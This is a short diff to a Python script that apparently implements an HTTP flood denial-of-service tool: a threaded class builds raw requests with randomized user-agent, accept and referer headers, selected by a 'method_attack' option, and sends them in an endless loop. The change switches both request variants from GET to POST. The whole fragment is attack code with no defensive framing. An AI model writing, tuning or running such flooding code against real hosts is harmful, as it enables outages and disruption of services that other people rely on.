@@ -172,10 +172,10 @@ class Home(threading.Thread):
         accept    = random.choice(acceptall)
         referer   = "Referer: " +random.choice(ref) + url+ "\r\n"
         if method_attack == "1":
-            get_host = "GET / HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
+            get_host = "POST / HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
             request  = get_host + useragent + accept + content + length + "\r\n"
         else:
-            get_host = 'GET' + " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
+            get_host = 'POST' + " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
             request  = get_host + useragent + accept + referer + content + length + "\r\n"
         while True:
             try:
